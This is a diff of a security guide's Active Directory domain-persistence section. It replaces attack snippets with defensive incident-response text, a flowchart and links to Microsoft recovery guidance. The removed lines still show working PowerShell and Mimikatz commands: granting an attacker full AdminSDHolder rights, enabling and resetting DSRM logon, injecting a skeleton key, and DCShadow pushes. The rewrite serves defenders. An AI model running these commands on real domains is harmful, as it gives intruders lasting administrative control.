@@ -352,62 +352,42 @@ For log meanings and collection details, see Microsoft's [4624 event reference](
  
 
 ## Domain Persistence
-
+ 
+Domain-level persistence can involve privileged ticket-signing keys, protected-object permissions, domain-controller recovery credentials, or changes to directory replication and controller state. Treat these as control-plane incidents: preserve evidence, establish trusted recovery points, and use the organization's forest-recovery runbook.
+ 
+```mermaid
+flowchart LR
+    A[Unexpected privileged<br/>authentication or directory change] --> B[Preserve DC, endpoint,<br/>and identity evidence]
+    B --> C[Review krbtgt, AdminSDHolder,<br/>DSRM, and DC state]
+    C --> D[Compare with approved<br/>baseline and change records]
+    D --> E{Domain compromise<br/>supported?}
+    E -->|No or unclear| F[Continue scoped<br/>investigation and monitoring]
+    E -->|Yes| G[Contain and recover from<br/>trusted backups/runbook]
+    G --> H[Rotate affected secrets,<br/>validate replication and access]
+```
+ 
 ### Golden Ticket Persistence
-
-```powershell
-# After obtaining krbtgt hash, forge tickets indefinitely
-# Mitigate: reset krbtgt password TWICE (tickets have 10hr max lifetime, 7 day renewal)
-# Detection: Windows Event ID 4769, anomalous PAC fields
-```
-
+ 
+Compromise of the krbtgt key can allow forged ticket-granting tickets. Resetting a normal user or administrator password does not rotate the krbtgt key. A forged ticket's lifetime and the evidence available to defenders depend on ticket policy, platform behavior, and what was logged; do not rely on a fixed lifetime or one event ID as a universal detector.
+ 
+If krbtgt compromise is suspected, follow Microsoft's [supported forest-recovery reset procedure](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password). Check replication health first and follow its password-reset sequence. The 10-hour wait is based on Microsoft's default ticket-lifetime settings; if those settings differ, the minimum wait must exceed the configured lifetime.
+ 
 ### AdminSDHolder Abuse
-
-```powershell
-# AdminSDHolder ACL propagates to all protected groups every 60 minutes
-# Add yourself to AdminSDHolder ACL = persistent admin rights
-
-Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
-    -PrincipalIdentity attacker `
-    -Rights All
-```
-
+ 
+AdminSDHolder stores the security descriptor template used to protect selected privileged accounts and groups. By default, SDProp runs every 60 minutes on the domain controller holding the PDC Emulator role and reapplies the template where needed. Review both AdminSDHolder and affected protected objects; repeated permission changes can otherwise obscure the source of an unexpected right. See Microsoft's [protected accounts and AdminSDHolder guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory).
+ 
 ### DSRM Abuse
-
-```powershell
-# Directory Services Restore Mode password - local admin on DC even after domain compromise
-# Enable DSRM logon via network (disabled by default)
-New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
-
-# Change DSRM password
-ntdsutil "set dsrm password" "reset password on server null" "P@ssword1" q q
-```
-
+ 
+Directory Services Restore Mode is a separate recovery account and credential for a domain controller. Protect and rotate it as a recovery secret, restrict who can retrieve it, and audit its use. Microsoft Windows LAPS can manage and back up DSRM passwords when configured; review its [architecture and access-control model](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Keep recovery credentials available to authorized recovery staff and protected from ordinary administrative access.
+ 
 ### Skeleton Key
-
-```powershell
-# Inject master password into LSASS on DC - all accounts accept both real and skeleton key
-# Mimikatz (runs in memory, lost on reboot)
-misc::skeleton
-
-# After injection, any account can authenticate with password "mimikatz"
-net use \\DC01\C$ /user:domain\Administrator mimikatz
-```
-
+ 
+“Skeleton key” describes a class of memory-resident domain-controller compromise claims, not a guaranteed universal password or a standalone detection signature. Investigate unexpected code or module changes on domain controllers, authentication anomalies, privileged sign-ins, and suspicious service or process activity. Confirm findings across multiple DCs and endpoint sources before deciding the scope.
+ 
 ### DCShadow
-
-```powershell
-# Register a rogue DC in AD, push arbitrary changes
-# Requires DA privileges initially
-
-# Terminal 1: Register as fake DC
-mimikatz # lsadump::dcshadow /object:CN=attacker,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:512
-
-# Terminal 2: Push changes
-mimikatz # lsadump::dcshadow /push
-```
-
----
+ 
+“DCShadow” describes unauthorized directory changes made through replication-related behavior. Review unexpected domain-controller registration or replication metadata, directory changes to privileged objects, and replication activity from unapproved identities or systems. A name or alert alone does not establish that a rogue domain controller was successfully used; validate against approved DC inventory and change records.
+ 
 
 ## Detection & Hunting
 
